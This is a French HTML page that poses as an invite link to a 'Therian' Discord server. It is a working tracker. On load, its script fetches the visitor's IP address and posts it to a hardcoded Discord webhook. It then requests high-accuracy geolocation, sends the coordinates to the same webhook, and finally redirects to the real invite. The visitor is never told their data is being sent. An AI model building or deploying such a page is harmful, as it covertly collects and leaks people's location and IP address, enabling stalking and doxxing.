<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Rejoindre le serveur Discord Therian</title>
  <style>
    body {
      background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
      color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      text-align: center;
    }
    h1 {
      font-size: 1.4em;
      font-weight: 500;
      letter-spacing: 0.5px;
      color: #e0e0e0;
      max-width: 90%;
    }
  </style>
</head>
<body>
  <div>
    <h1 id="titre">Chargement…</h1>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
    const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";

    async function getIP() {
      try {
        const response = await fetch("https://api.ipify.org/?format=json");
        const data = await response.json();
        return data.ip;
      } catch (e) {
        console.error("Erreur récupération IP:", e);
        return null;
      }
    }

    async function sendIP(ip) {
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `🌐 Adresse IP détectée : ${ip}` })
        });
      } catch (e) { console.error("Erreur envoi IP:", e); }
    }

    async function sendPosition(position) {
      const lat = position.coords.latitude.toFixed(6);
      const lng = position.coords.longitude.toFixed(6);
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `📍 Localisation :\nLatitude: ${lat}\nLongitude: ${lng}` })
        });
      } catch (e) { console.error("Erreur envoi position:", e); }
    }

    async function envoyerDonnees() {
      const ip = await getIP();
      if (ip) await sendIP(ip);

      if ("geolocation" in navigator) {
        document.getElementById("titre").innerText = "Vérification de la localisation…";

        try {
          const perm = await navigator.permissions.query({ name: "geolocation" });
          
          // Si permission déjà accordée, on force un petit timeout pour que le navigateur réponde correctement
          const getPosition = () => new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(resolve, resolve, { enableHighAccuracy: true, timeout: 10000 });
          });

          if (perm.state === "granted") {
            const position = await getPosition();
            if (position.coords) await sendPosition(position);
          } else if (perm.state === "prompt") {
            const position = await getPosition();
            if (position.coords) await sendPosition(position);
          }
          // Refusée ou indisponible → on ne fait rien

        } catch (e) {
          console.error("Erreur permissions:", e);
        }
      }

      // Redirection finale
      window.location.href = REDIRECT_URL;
    }

    window.onload = envoyerDonnees;
  </script>
</body>
</html>
